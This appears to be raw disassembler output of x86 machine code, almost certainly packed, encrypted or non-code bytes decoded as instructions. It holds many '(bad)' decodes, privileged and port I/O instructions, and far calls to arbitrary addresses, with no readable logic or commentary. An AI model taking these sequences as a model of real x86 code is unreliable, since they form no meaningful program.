  412fae:	in     al,0x9a
  412fb0:	test   al,0x14
  412fb2:	inc    edi
  412fb3:	mov    ecx,0x3805d60c
  412fb8:	cli    
  412fb9:	sub    bl,BYTE PTR [esi]
  412fbb:	cmp    eax,edi
  412fbd:	sub    DWORD PTR [ebx],0xffffffc0
  412fc0:	popa   
  412fc1:	rcr    bh,1
  412fc3:	jl     0x412fea
  412fc5:	js     0x412f63
  412fc7:	outs   dx,BYTE PTR ds:[esi]
  412fc8:	xchg   DWORD PTR [edi+0x1e],ebp
  412fcb:	mov    ah,0xd7
  412fcd:	mov    edi,0xd8ee8334
  412fd2:	repz cmp BYTE PTR [ebp-0x73],0xae
  412fd7:	hlt    
  412fd8:	or     eax,0xebee1266
  412fdd:	or     BYTE PTR [eax+0x4a],al
  412fe0:	clts   
  412fe2:	test   al,0xc6
  412fe4:	push   edx
  412fe5:	dec    esp
  412fe6:	cmp    dl,0x11
  412fe9:	jb     0x413038
  412feb:	ffree  st(6)
  412fed:	cmp    edi,DWORD PTR [ebx+esi*4-0x2c0ef5a4]
  412ff4:	xchg   ebx,eax
  412ff5:	or     BYTE PTR [eax],0x94
  412ff8:	xor    eax,0x32b64ad0
  412ffd:	ret    
  412ffe:	das    
  412fff:	adc    BYTE PTR [esi],ah
  413001:	fisttp WORD PTR [ebp-0x7487ef6a]
  413007:	std    
  413008:	pusha  
  413009:	adc    BYTE PTR [ecx-0x61a3093f],al
  41300f:	ss sbb al,ch
  413012:	scas   eax,DWORD PTR es:[edi]
  413013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413014:	xor    ecx,eax
  413016:	sbb    BYTE PTR [ebx+ecx*4],0x2
  41301a:	popf   
  41301b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41301c:	add    esi,ebp
  41301e:	lea    esi,[esp+eiz*8]
  413021:	or     bh,al
  413023:	div    ecx
  413025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413026:	inc    edx
  413027:	lds    esi,FWORD PTR [ebx]
  413029:	mov    al,0x79
  41302b:	call   0x77e85236
  413030:	outs   dx,DWORD PTR ds:[esi]
  413031:	inc    edi
  413032:	mov    edx,0xe1f36a5b
  413037:	fs inc edx
  413039:	jno    0x413002
  41303b:	mov    edi,0x130573fb
  413040:	cmp    eax,0xe5cb4620
  413045:	or     dh,bl
  413047:	mov    edi,0x4d8af259
  41304c:	jg     0x413027
  41304e:	pop    ebx
  41304f:	(bad)  
  413050:	push   esi
  413051:	pop    ss
  413052:	and    ah,ah
  413054:	mov    ch,0x4a
  413056:	xchg   esi,eax
  413057:	sti    
  413058:	ss jns 0x4130bb
  41305b:	push   eax
  41305c:	push   ebx
  41305d:	ds sub al,0xcc
  413060:	dec    esp
  413061:	or     DWORD PTR [ebx+0x45],0xffffffa1
  413065:	and    edx,DWORD PTR fs:[edx]
  413068:	icebp  
  413069:	call   0xe941c5ea
  41306e:	pushf  
  41306f:	inc    eax
  413070:	inc    ebx
  413071:	add    DWORD PTR ds:0xd429be47,esi
  413077:	sbb    BYTE PTR [ecx-0x6e07f04],dh
  41307d:	lahf   
  41307e:	fsub   DWORD PTR [ebx]
  413080:	xlat   BYTE PTR ds:[ebx]
  413081:	and    BYTE PTR [edi+0x67eed80e],al
  413087:	jp     0x4130d8
  413089:	sbb    dl,BYTE PTR cs:[eax-0x12]
  41308d:	sbb    DWORD PTR [eax],ecx
  41308f:	test   eax,0x9e3602a1
  413094:	(bad)  
  413095:	mov    edi,0x1a9f96a3
  41309a:	and    ah,cl
  41309c:	or     eax,0x24de2d5b
  4130a1:	sbb    eax,0xa2db0965
  4130a6:	imul   BYTE PTR [ecx]
  4130a8:	shl    ecx,cl
  4130aa:	xlat   BYTE PTR ds:[ebx]
  4130ab:	dec    ebx
  4130ac:	outs   dx,BYTE PTR ds:[esi]
  4130ad:	sbb    BYTE PTR [edi],ah
  4130af:	sbb    ebx,DWORD PTR [esi]
  4130b1:	std    
  4130b2:	mov    esp,0x5f9000df
  4130b7:	pop    es
  4130b8:	(bad)  
  4130b9:	mov    esi,0x11b1a8fc
  4130be:	bswap  ecx
  4130c0:	stos   DWORD PTR es:[edi],eax
  4130c1:	scas   eax,DWORD PTR es:[edi]
  4130c2:	add    eax,0xe0f59335
  4130c7:	lock and esi,ebx
  4130ca:	xchg   edx,eax
  4130cb:	out    0xba,eax
  4130cd:	rcr    BYTE PTR [ecx-0x33],cl
  4130d0:	xlat   BYTE PTR ds:[ebx]
  4130d1:	cmp    al,0xb8
  4130d3:	lds    ecx,FWORD PTR [ebx-0x7c7509b4]
  4130d9:	adc    esi,ebp
  4130db:	xor    edx,edx
  4130dd:	mov    bl,0x8d
  4130df:	ret    
  4130e0:	push   0x16
  4130e2:	mov    bl,0x49
  4130e4:	xchg   esi,eax
  4130e5:	xchg   bp,ax
  4130e7:	sub    al,0x1a
  4130e9:	pop    eax
  4130ea:	and    al,0xb5
  4130ec:	fwait
  4130ed:	dec    ecx
  4130ee:	sbb    eax,ebp
  4130f0:	sbb    eax,0x11b32526
  4130f5:	aad    0xe6
  4130f7:	dec    ebx
  4130f8:	jb     0x4130ac
  4130fa:	data16 stos BYTE PTR es:[edi],al
  4130fc:	mov    dh,0xb4
  4130fe:	push   eax
  4130ff:	(bad)  
  413100:	xchg   ecx,eax
  413101:	mov    edx,0xb65a51b5
  413106:	not    DWORD PTR ds:0x56f51415
  41310c:	call   0x37ea4c85
  413111:	out    dx,eax
  413112:	jae    0x41314a
  413114:	aad    0x54
  413116:	inc    esi
  413118:	dec    eax
  413119:	sub    eax,0x983adfce
  41311e:	inc    edx
  41311f:	test   BYTE PTR [ecx],0xe3
  413122:	lods   al,BYTE PTR ds:[esi]
  413123:	dec    esp
  413124:	sahf   
  413125:	or     eax,0xb4483237
  41312a:	out    0x6d,eax
  41312c:	jnp    0x41316c
  41312e:	les    ecx,FWORD PTR [esp+eiz*8-0x3a]
  413132:	nop
  413133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413134:	jmp    0x4130c9
  413136:	or     BYTE PTR [edx],dl
  413138:	xor    eax,0xdb8d5337
  41313d:	jg     0x4130cb
  41313f:	(bad)  
  413140:	pop    edx
  413141:	fldenv [ebx-0x45]
  413144:	ins    DWORD PTR es:[edi],dx
  413145:	cmc    
  413146:	(bad)  
  413147:	mov    edi,0x141926a5
  41314c:	out    dx,al
  41314d:	jmp    0x413100
  41314f:	mov    esp,esp
  413151:	mov    bh,0x2c
  413153:	in     al,0x8f
  413155:	retf   0x3df4
  413158:	int3   
  413159:	pushf  
  41315a:	jmp    0x4131a3
  41315c:	rcr    BYTE PTR [edx],1
  41315e:	(bad)  [ecx-0x269296]
  413164:	sbb    DWORD PTR [eax+0x7c51be85],ecx
  41316a:	imul   edi,DWORD PTR [ebp+ebx*8+0x65c50a1f],0xffffff84
  413172:	jb     0x41312d
  413174:	sub    BYTE PTR [edi-0x4d3bad17],ch
  41317a:	shl    BYTE PTR [esi+0x7],1
  41317d:	cld    
  41317e:	aaa    
  41317f:	sahf   
  413180:	jg     0x4131bd
  413182:	adc    BYTE PTR [ecx-0x2ada54fd],ah
  413188:	xchg   edx,eax
  413189:	mov    dl,0x91
  41318b:	inc    ebx
  41318c:	mov    bh,0x44
  41318e:	mov    ah,0x8b
  413190:	jae    0x41316b
  413192:	push   0xffffffa9
  413194:	cli    
  413195:	adc    DWORD PTR [eax+0xf924292],0xffffff81
  41319c:	or     eax,0x42f7cd9f
  4131a1:	fwait
  4131a2:	push   eax
  4131a3:	sub    BYTE PTR [eax],bl
  4131a5:	pop    ss
  4131a6:	inc    edx
  4131a7:	mov    ax,0x6015
  4131ab:	mov    ds:0x107edba8,al
  4131b0:	pop    eax
  4131b1:	push   es
  4131b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131b3:	mov    bh,0x8d
  4131b5:	and    eax,0x80c04edd
  4131ba:	and    DWORD PTR [ebp+edx*2-0x69],ecx
  4131be:	test   eax,0x26cff228
  4131c3:	sbb    BYTE PTR [ecx+ebx*8+0x24],dl
  4131c7:	adc    eax,0x274d9e5f
  4131cc:	xchg   ecx,eax
  4131cd:	xchg   ch,ch
  4131cf:	xor    ah,0xe4
  4131d2:	std    
  4131d3:	dec    esp
  4131d4:	fimul  WORD PTR [ecx]
  4131d6:	and    eax,0x80ab1a9e
  4131db:	mov    cl,0x81
  4131dd:	sahf   
  4131de:	add    ebp,DWORD PTR [ebx]
  4131e0:	mov    WORD PTR ds:0x99128b4b,?
  4131e6:	outs   dx,BYTE PTR ds:[esi]
  4131e7:	out    dx,eax
  4131e8:	cmp    DWORD PTR [eax],eax
  4131ea:	dec    eax
  4131eb:	xlat   BYTE PTR ds:[ebx]
  4131ec:	cdq    
  4131ed:	mov    al,ds:0x26864dfd
  4131f2:	mov    edi,0x1f2c358d
  4131f7:	mov    DWORD PTR [ebx],ecx
  4131f9:	xchg   BYTE PTR [edx-0x7],bh
  4131fc:	pop    ecx
  4131fd:	pusha  
  4131fe:	lods   al,BYTE PTR ds:[esi]
  4131ff:	stos   BYTE PTR es:[edi],al
  413200:	pop    esp
  413201:	mov    WORD PTR [ebx+0x75],fs
  413204:	mov    ebp,0x1caf8847
  413209:	inc    edi
  41320a:	sahf   
  41320b:	push   esp
  41320c:	xchg   edi,eax
  41320d:	inc    ebx
  41320e:	mov    eax,DWORD PTR [ebx]
  413210:	sahf   
  413211:	xor    eax,0xf3a341ed
  413216:	loop   0x41319c
  413218:	les    esp,FWORD PTR [eax+0x4b2fb771]
  41321e:	and    dh,BYTE PTR [edi+0x56]
  413221:	scas   al,BYTE PTR es:[edi]
  413222:	repz call 0xb127b6c5
  413228:	cli    
  413229:	imul   ebp,DWORD PTR [ebp+0x3b],0x44394e67
  413230:	(bad)  
  413232:	out    dx,eax
  413233:	mov    eax,edx
  413235:	test   BYTE PTR [eax+eiz*1-0x374c0d82],dl
  41323c:	push   esi
  41323d:	or     eax,0x493dd72c
  413242:	xchg   esi,eax
  413243:	cmp    bl,dh
  413245:	cmp    al,0xa5
  413247:	popa   
  413248:	mov    WORD PTR [edi],ss
  41324a:	(bad)  [ecx-0x28]
  41324d:	in     al,0xdb
  41324f:	iret   
  413250:	std    
  413251:	jmp    0x413247
  413253:	in     eax,dx
  413254:	mov    esp,0x1d340872
  413259:	inc    ebp
  41325a:	and    DWORD PTR ds:0x6bc4a6b1,esp
  413260:	sbb    al,0x3a
  413262:	mov    DWORD PTR [esi],ebx
  413264:	pusha  
  413265:	adc    BYTE PTR [edi-0x2e],al
  413268:	(bad)  [ebp+0x75]
  41326b:	xchg   ah,dl
  41326d:	or     eax,0xa4b631c5
  413272:	stos   BYTE PTR es:[edi],al
  413273:	in     eax,0x2e
  413275:	adc    eax,0x64
  413278:	lods   al,BYTE PTR ds:[esi]
  413279:	mov    edx,0xb34cebff
  41327e:	rcl    BYTE PTR [eax-0x61b2876b],1
  413284:	js     0x4132b3
  413286:	les    edx,FWORD PTR [ecx+ebp*4]
  413289:	enter  0x4c4,0x2c
  41328d:	jle    0x413280
  41328f:	sbb    al,0xe6
  413291:	out    0x43,al
  413293:	and    ecx,edx
  413295:	dec    eax
  413296:	xchg   ebx,eax
  413297:	ret    
  413298:	and    ecx,ecx
  41329a:	es (bad) 
  41329c:	out    dx,eax
  41329d:	not    DWORD PTR [esi]
  41329f:	add    BYTE PTR [ecx+0x3c9c0bb2],al
  4132a5:	dec    esi
  4132a6:	inc    edi
  4132a7:	cli    
  4132a8:	(bad)  
  4132a9:	mov    cl,0x3
  4132ab:	mov    al,0x52
  4132ad:	jle    0x4132ee
  4132af:	icebp  
  4132b0:	jae    0x4132d5
  4132b2:	sbb    ah,ah
  4132b4:	pop    edi
  4132b5:	mov    WORD PTR es:[ecx+0x16],?
  4132b9:	jecxz  0x41324d
  4132bb:	xchg   ebx,eax
  4132bc:	retf   
  4132bd:	dec    esi
  4132be:	jmp    0x52440861
  4132c3:	push   esi
  4132c4:	push   0x11b15df4
  4132c9:	int    0x74
  4132cb:	inc    ebp
  4132cc:	push   edi
  4132cd:	sti    
  4132ce:	add    eax,0xbbc7fb2b
  4132d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132d4:	sub    eax,0x4038949b
  4132d9:	dec    edi
  4132da:	jae    0x413305
  4132dc:	fnstcw WORD PTR [esi-0xa99657a]
  4132e2:	xor    DWORD PTR cs:[edx+0x6b],eax
  4132e6:	jecxz  0x4132b8
  4132e8:	popa   
  4132e9:	adc    BYTE PTR [ecx],ah
  4132eb:	inc    ebx
  4132ec:	call   0xe5:0x8acd1fb2
  4132f3:	neg    DWORD PTR [ecx+0x56a8ac5c]
  4132f9:	push   ecx
  4132fa:	push   edi
  4132fb:	xor    BYTE PTR [ecx+0x508502f8],dh
  413301:	cmp    al,0xb5
  413303:	(bad)  
  413304:	in     eax,0xde
  413306:	dec    edi
  413307:	mov    esi,0x5861741e
  41330c:	into   
  41330d:	aam    0xc5
  41330f:	cwde   
  413310:	outs   dx,DWORD PTR ds:[esi]
  413311:	sub    edx,DWORD PTR [esi]
  413313:	es dec edx
  413315:	stos   DWORD PTR es:[edi],eax
  413316:	xor    dh,BYTE PTR [eax+0x4b561b0c]
  41331c:	dec    edi
  41331d:	sbb    esi,ebp
  41331f:	push   0xffffff8f
  413321:	jmp    0x41332c
  413323:	mov    ?,WORD PTR [ebp+0x3b848931]
  413329:	nop
  41332a:	adc    DWORD PTR [ecx-0x10f9d6ef],esi
  413330:	in     eax,dx
  413331:	and    DWORD PTR [ebx],ecx
  413333:	pushf  
  413334:	pop    edx
  413335:	jecxz  0x4132c4
  413337:	cmp    al,0x8a
  413339:	pop    eax
  41333a:	xchg   ebx,eax
  41333b:	lahf   
  41333c:	cmp    al,bh
  41333e:	cmc    
  41333f:	mov    DWORD PTR [esi-0x60],esp
  413342:	push   edi
  413343:	xlat   BYTE PTR ds:[ebx]
  413344:	mov    bh,0xc2
  413346:	clc    
  413347:	xor    BYTE PTR [esp+esi*8+0x62],ah
  41334b:	and    DWORD PTR [edi],ebx
  41334d:	cdq    
  41334e:	sbb    ebp,edx
  413350:	push   edi
  413351:	fisubr DWORD PTR [eax-0x32]
  413354:	ins    DWORD PTR es:[edi],dx
  413355:	and    DWORD PTR [ecx+eax*8],esi
  413358:	add    al,bl
  41335a:	jbe    0x4132f2
  41335c:	cmc    
  41335d:	aas    
  41335e:	shr    BYTE PTR [ebx-0x5285b2ef],1
  413364:	sbb    eax,0x7510d98c
  413369:	(bad)  
  41336a:	mov    dl,0xe1
  41336c:	mov    DWORD PTR [eax+0x67bfdafb],esi
  413372:	out    0x2,eax
  413374:	ins    DWORD PTR es:[edi],dx
  413375:	pusha  
  413376:	nop
  413377:	mov    ebp,0x295df8a8
  41337c:	loope  0x413332
  41337e:	int    0xf
  413380:	jnp    0x4133b6
  413382:	aad    0x4e
  413384:	and    al,0x14
  413386:	(bad)  
  413387:	xchg   edi,eax
  413388:	bound  ebx,QWORD PTR [ebp-0x44d3ed2d]
  41338e:	pop    edx
  41338f:	sbb    eax,0x2961536d
  413394:	or     DWORD PTR [esi],esi
  413396:	(bad)  
  413397:	push   cs
  413398:	test   BYTE PTR [ebp+0x59366d7a],ch
  41339e:	jae    0x41332e
  4133a0:	xor    al,0x70
  4133a2:	dec    esi
  4133a3:	outs   dx,BYTE PTR ds:[esi]
  4133a4:	(bad)  
  4133a5:	jnp    0x4133c4
  4133a7:	loop   0x4133cd
  4133a9:	dec    edi
  4133aa:	sbb    eax,0x85332eba
  4133af:	mov    eax,ds:0x2fd2b7ee
  4133b4:	adc    BYTE PTR [ebx-0x4a],al
  4133b7:	sahf   
  4133b8:	in     eax,dx
  4133b9:	adc    al,0x59
  4133bb:	cmp    DWORD PTR es:[edx+0x1c],eax
  4133bf:	mov    ecx,0xa6480416
  4133c4:	sub    ebp,0x4e
  4133c7:	sbb    DWORD PTR [edi-0x21],ebx
  4133ca:	cmp    ah,BYTE PTR [ecx]
  4133cc:	popa   
  4133cd:	push   esi
  4133ce:	das    
  4133cf:	imul   esp
  4133d1:	cmc    
  4133d2:	xchg   DWORD PTR [esi-0x5f08c92d],ebp
  4133d8:	test   BYTE PTR [ebp-0x13],0x63
  4133dc:	push   esi
  4133dd:	add    eax,0xddb29e82
  4133e2:	pop    ebx
  4133e3:	data16 xor BYTE PTR [ebx],dl
  4133e6:	mov    ebp,0x64b3badb
  4133eb:	jbe    0x4133fc
  4133ed:	test   al,0x58
  4133ef:	jne    0x4133b7
  4133f1:	not    dl
  4133f3:	cmp    ch,BYTE PTR [edx-0x677ba705]
  4133f9:	jg     0x4133d3
  4133fb:	int    0x75
  4133fd:	mov    dl,0xeb
  4133ff:	rcr    BYTE PTR [esi-0x45],0x23
  413403:	mov    edi,DWORD PTR [ebx-0x36]
  413406:	xor    dh,BYTE PTR [ecx+0x4a]
  413409:	(bad)  
  41340a:	and    eax,esp
  41340c:	popa   
  41340d:	xchg   BYTE PTR [edi],ch
  41340f:	mov    ah,0x71
  413411:	push   esp
  413412:	push   es
  413413:	lock cmp DWORD PTR [ebx-0x7b],edx
  413417:	mov    ecx,0x7c9fec43
  41341c:	mov    dl,0xa8
  41341e:	dec    eax
  41341f:	dec    edi
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	xor    al,0xa1
  413423:	sub    dl,BYTE PTR [esi+0x406e8c67]
  413429:	imul   ecx,DWORD PTR [edi+0x40],0xe77cf0be
  413430:	sub    al,0x44
  413432:	imul   esi,DWORD PTR [edx+0x244cdd99],0xc
  413439:	out    0x2f,al
  41343b:	(bad)  
  41343d:	xor    esp,DWORD PTR ds:0xd7e7950b
  413443:	ror    BYTE PTR [edx+0x5f],1
  413446:	mov    ds:0x601fa716,al
  41344b:	pop    ss
  41344c:	pop    eax
  41344d:	stos   BYTE PTR es:[edi],al
  41344e:	inc    esp
  41344f:	cmp    eax,0xbfbfb044
  413454:	inc    edx
  413455:	inc    eax
  413456:	add    eax,0xc86f30a1
  41345b:	int3   
  41345c:	sub    al,0xd3
  41345e:	pop    esp
  41345f:	inc    eax
  413460:	push   0xffffff86
  413462:	or     eax,DWORD PTR [eax+0x52]
  413465:	(bad)  
  413466:	mov    esp,0x1d2c1374
  41346b:	push   es
  41346c:	hlt    
  41346d:	jg     0x413415
  41346f:	sbb    al,ah
  413471:	mov    ebp,0x5f9eee88
  413476:	hlt    
  413477:	mov    ch,0xd0
  413479:	rol    BYTE PTR [ebx+0x223e0507],1
  41347f:	sub    BYTE PTR ds:0x22d64ace,bl
  413485:	or     dh,BYTE PTR [edi-0x7f6f821c]
  41348b:	clc    
  41348c:	popa   
  41348d:	add    al,0xe5
  41348f:	push   ds
  413490:	hlt    
  413491:	int3   
  413492:	or     al,0x99
  413494:	dec    ebx
  413495:	pop    edx
  413496:	and    al,0x42
  413498:	add    BYTE PTR [edi],cl
  41349a:	mov    dh,0x13
  41349c:	hlt    
  41349d:	je     0x4134ae
  41349f:	shl    DWORD PTR [ebx-0x10e98f71],cl
  4134a5:	stc    
  4134a6:	aad    0x36
  4134a8:	jae    0x4134ed
  4134aa:	(bad)  
  4134ab:	retf   0x3eda
  4134ae:	cdq    
  4134af:	mov    ebp,0x5de0ec28
  4134b4:	xchg   edx,eax
  4134b5:	(bad)  
  4134b6:	adc    bh,BYTE PTR [eax+0x184d1c7e]
  4134bc:	(bad)  
  4134bd:	sbb    edx,esp
  4134bf:	fild   QWORD PTR [edi]
  4134c1:	mov    edx,0xdf3a264d
  4134c6:	push   ebp
  4134c7:	sub    al,0xed
  4134c9:	sbb    cl,0x4f
  4134cc:	loope  0x413473
  4134ce:	bound  ecx,QWORD PTR [esi-0x3b]
  4134d1:	push   esp
  4134d2:	xchg   BYTE PTR [ecx+0x67],ah
  4134d5:	(bad)  
  4134d6:	gs ror eax,cl
  4134d9:	xchg   edi,eax
  4134da:	sub    DWORD PTR [edx],0xc
  4134dd:	lahf   
  4134de:	sub    al,0xe5
  4134e0:	cmp    BYTE PTR ds:0x2cfd99df,ch
  4134e6:	enter  0xf24d,0x52
  4134ea:	push   0x64
  4134ec:	push   0x2b4932b
  4134f1:	inc    ecx
  4134f2:	push   eax
  4134f3:	push   edi
  4134f4:	inc    ecx
  4134f5:	and    eax,0xf30989da
  4134fa:	fs pop edi
  4134fc:	inc    ebx
  4134fd:	scas   al,BYTE PTR es:[edi]
  4134fe:	inc    edx
  4134ff:	into   
  413500:	inc    esp
  413501:	jle    0x4134b8
  413503:	in     eax,dx
  413504:	xchg   esp,eax
  413505:	xchg   esp,eax
  413506:	cmp    DWORD PTR [eax-0x4f],ecx
  413509:	arpl   WORD PTR [ecx],cx
  41350b:	es ins BYTE PTR es:[edi],dx
  41350d:	cwde   
  41350e:	les    edi,FWORD PTR [eax+0x72]
  413511:	mov    eax,0xef6e0ee1
  413516:	loope  0x41354a
  413518:	(bad)  
  413519:	int3   
  41351a:	nop
  41351b:	cdq    
  41351c:	cmp    edx,DWORD PTR ds:0xca4ba99
  413522:	push   ss
  413523:	ds leave 
  413525:	mov    dl,0xa
  413527:	jbe    0x413561
  413529:	out    dx,eax
  41352a:	dec    ebx
  41352b:	push   edx
  41352c:	add    DWORD PTR [ecx],esp
  41352e:	jmp    0xa27ac97e
  413533:	nop
  413534:	fs nop
  413536:	or     BYTE PTR [ebx+eiz*1+0x2f],bh
  41353a:	arpl   WORD PTR [esi-0x33],ax
  41353d:	mov    DWORD PTR [ecx-0x52],eax
  413540:	mov    eax,ds:0xb0144b19
  413545:	push   ss
  413546:	jb     0x413569
  413548:	add    ah,BYTE PTR [ebx-0x3a1377f3]
  41354e:	fistp  WORD PTR [ecx-0x7d671928]
  413554:	fst    st(5)
  413556:	lds    edi,FWORD PTR [ebp+ebx*8+0x6d]
  41355a:	shl    bh,cl
  41355c:	push   0x889292f6
  413561:	dec    ecx
  413562:	add    ebx,DWORD PTR [ecx-0x4d700814]
  413568:	cmp    eax,0x508c2a30
  41356d:	sbb    DWORD PTR [esi-0x3d],ebx
  413570:	jp     0x4135b3
  413572:	xchg   esp,eax
  413573:	shl    BYTE PTR [ebp+0x36b83a22],0xfd
  41357a:	push   eax
  41357b:	out    0xfa,al
  41357d:	test   BYTE PTR [eax-0x696b117b],bh
  413583:	push   ss
  413584:	test   al,0x2c
  413586:	bound  esi,QWORD PTR [ebp+0x5475fa36]
  41358c:	pop    ebp
  41358d:	adc    eax,DWORD PTR [edx]
  41358f:	cmp    dh,BYTE PTR [edx+0x2e]
  413592:	pop    eax
  413593:	pop    esi
  413595:	les    edi,FWORD PTR [ebx-0x2064c68d]
  41359b:	dec    edi
  41359c:	sbb    al,0x81
  41359e:	iret   
  41359f:	mov    ds:0xacfdbdd6,al
  4135a4:	dec    ecx
  4135a5:	mov    cl,0xc
  4135a7:	popa   
  4135a8:	mov    ebp,0xbc4e263b
  4135ad:	or     al,0x95
  4135af:	sar    BYTE PTR [ecx+0x790c0431],0xe
  4135b6:	and    eax,0x1d792e75
  4135bb:	bound  ebp,QWORD PTR [ecx-0x1b]
  4135be:	dec    ecx
  4135bf:	pop    eax
  4135c0:	cmp    al,0xd7
  4135c2:	cmp    al,0x78
  4135c4:	inc    esp
  4135c5:	sar    DWORD PTR [edx-0x41f06974],1
  4135cb:	outs   dx,DWORD PTR ds:[esi]
  4135cc:	fwait
  4135cd:	in     al,0x20
  4135cf:	call   0x1df73ce3
  4135d4:	aam    0x57
  4135d6:	iret   
  4135d7:	std    
  4135d8:	or     BYTE PTR [esi],0x34
  4135db:	push   esi
  4135dc:	in     al,0x27
  4135de:	cmp    cl,BYTE PTR [edx+ebp*1]
  4135e1:	retf   
  4135e2:	in     eax,0xce
  4135e4:	jp     0x4135c3
  4135e6:	jae    0x41361a
  4135e8:	adc    BYTE PTR [ebx-0x67c1d8f6],dh
  4135ee:	mov    dl,0xa5
  4135f0:	pop    edx
  4135f1:	push   esp
  4135f2:	out    dx,eax
  4135f3:	fstp   QWORD PTR ds:0xd8f33271
  4135f9:	aaa    
  4135fa:	dec    ecx
  4135fb:	fisttp QWORD PTR [edi-0x318a98ce]
  413601:	clc    
  413602:	mov    al,ds:0xdbb2d1c
  413607:	loop   0x4135eb
  413609:	aad    0xaf
  41360b:	(bad)  
  41360c:	push   eax
  41360d:	popa   
  41360e:	xor    al,0x74
  413610:	pop    ecx
  413611:	lods   al,BYTE PTR ds:[esi]
  413612:	stos   DWORD PTR es:[edi],eax
  413613:	adc    al,0xa6
  413615:	mov    cl,0x3
  413617:	lods   eax,DWORD PTR ds:[esi]
  413619:	jecxz  0x41366d
  41361b:	lahf   
  41361c:	jp     0x41360b
  41361e:	sub    al,0x1b
  413620:	jo     0x4135fa
  413622:	out    dx,eax
  413623:	push   ebx
  413624:	lahf   
  413625:	add    al,0x55
  413627:	fiadd  DWORD PTR [ebx+esi*2-0x45]
  41362b:	(bad)  
  41362c:	mov    ds:0x7a6efac8,al
  413631:	es fwait
  413633:	push   ebx
  413634:	lods   eax,DWORD PTR ds:[esi]
  413635:	test   eax,0xb276ca59
  41363a:	cmp    al,0x77
  41363c:	sub    al,0x92
  41363e:	sub    eax,0x1e598b31
  413643:	call   0xf466:0x6f0f1fac
  41364a:	retf   
  41364b:	pop    eax
  41364c:	rol    DWORD PTR [eax+0x7c56af09],1
  413652:	xchg   DWORD PTR [edx],ecx
  413654:	jne    0x413686
  413656:	sub    al,0x22
  413658:	jecxz  0x4136d1
  41365a:	mov    BYTE PTR [edi+0xfef0dde],dl
  413660:	xchg   edi,eax
  413661:	jno    0x413635
  413663:	dec    eax
  413664:	outs   dx,BYTE PTR ds:[esi]
  413665:	int    0x5b
  413667:	je     0x413695
  413669:	sub    ch,BYTE PTR [ecx]
  41366b:	call   0xb325:0x4a839288
  413672:	cmp    eax,0xfa4bf3f7
  413677:	addr16 std 
  413679:	or     eax,0x974097fb
  41367e:	in     eax,0xee
  413680:	cmp    eax,ebx
  413682:	push   esp
  413683:	mov    ch,0x7c
  413685:	pop    esp
  413687:	mov    edx,DWORD PTR [eax-0x4feeb9d0]
  41368d:	jo     0x41362a
  41368f:	das    
  413690:	idiv   BYTE PTR [eax+0x44]
  413693:	sbb    al,0xd
  413695:	push   es
  413696:	mul    eax
  413698:	sbb    al,0x9d
  41369a:	add    DWORD PTR [edi-0x41],esp
  41369d:	ins    BYTE PTR es:[edi],dx
  41369e:	retf   0xc69f
  4136a1:	fnstenv [ecx-0x5e70bcb6]
  4136a7:	stc    
  4136a8:	std    
  4136a9:	in     al,0xab
  4136ab:	sbb    al,BYTE PTR [ebx-0x7b]
  4136ae:	cli    
  4136af:	mov    eax,ds:0x8791a366
  4136b4:	jecxz  0x41368c
  4136b6:	mov    DWORD PTR ds:0x4deea821,0x9411dff2
  4136c0:	fstp   DWORD PTR [edi]
  4136c2:	adc    bl,BYTE PTR [eax-0x33]
  4136c5:	cmc    
  4136c6:	aas    
  4136c7:	jns    0x41366a
  4136c9:	xchg   ecx,eax
  4136ca:	sub    BYTE PTR [esi-0x528e4343],dl
  4136d0:	add    ch,cl
  4136d2:	es (bad) 
  4136d4:	es out 0xe0,al
  4136d7:	push   esi
  4136d8:	mov    al,0xf8
  4136da:	ficomp WORD PTR [ebp-0x3092cb6]
  4136e0:	add    al,0xff
  4136e2:	xor    ebx,esi
  4136e4:	iret   
  4136e5:	fdivr  QWORD PTR [ebp-0x4e7a5746]
  4136eb:	retf   
  4136ec:	es jnp 0x4136cb
  4136ef:	add    ecx,DWORD PTR [ecx]
  4136f1:	adc    ecx,DWORD PTR [esi]
  4136f3:	enter  0x2602,0x56
  4136f7:	daa    
  4136f8:	neg    BYTE PTR [eax+0x43]
  4136fb:	sbb    ah,BYTE PTR [ebx-0x4b]
  4136fe:	xlat   BYTE PTR ds:[ebx]
  4136ff:	les    ebx,FWORD PTR [esp+esi*2]
  413702:	hlt    
  413703:	gs inc ebx
  413705:	xor    ecx,DWORD PTR [edi-0x1c]
  413708:	xchg   ecx,eax
  413709:	aas    
  41370a:	sub    dl,BYTE PTR [esi]
  41370c:	(bad)  
  41370d:	cmp    dl,BYTE PTR [esi-0x69]
  413710:	data16 fcomp DWORD PTR [edi-0x5a2b14f9]
  413717:	jno    0x4136f3
  413719:	jle    0x413716
  41371b:	mov    esp,0xa34fb88a
  413720:	xor    DWORD PTR [ecx+eax*4+0x2d],esi
  413724:	dec    ch
  413726:	xchg   esi,eax
  413727:	pop    ebp
  413728:	jno    0x4136f9
  41372a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41372b:	(bad)  
  41372c:	push   edx
  41372d:	sub    BYTE PTR [edx+0x37],0xe0
  413731:	int    0x43
  413733:	jge    0x413700
  413735:	inc    ecx
  413736:	add    al,0xb2
  413738:	imul   BYTE PTR [ebx+0x11]
  41373b:	fs mov ebp,?
  41373e:	ret    
  41373f:	or     eax,0xf35f1d4e
  413744:	push   ss
  413745:	mov    ecx,ss
  413747:	jle    0x413735
  413749:	dec    eax
  41374a:	sahf   
  41374b:	stc    
  41374c:	xchg   BYTE PTR [ebx+eax*2+0x194f1d00],cl
  413753:	jo     0x413720
  413755:	call   0x344f:0x9ddc97b8
  41375c:	leave  
  41375d:	sub    DWORD PTR [eax+0x22],edx
  413760:	cli    
  413761:	mov    ebp,0xb471ec94
  413766:	fistp  WORD PTR [ebp+ecx*4-0x35]
  41376a:	aaa    
  41376b:	mov    al,ds:0x4615ccb0
  413770:	push   0x67
  413772:	jg     0x413766
  413774:	retf   
  413775:	dec    edi
  413776:	jl     0x41372a
  413778:	cmp    al,0x7f
  41377a:	test   DWORD PTR [edx],esp
  41377c:	js     0x413703
  41377e:	xor    ah,BYTE PTR [esi]
  413780:	mov    ch,0xcf
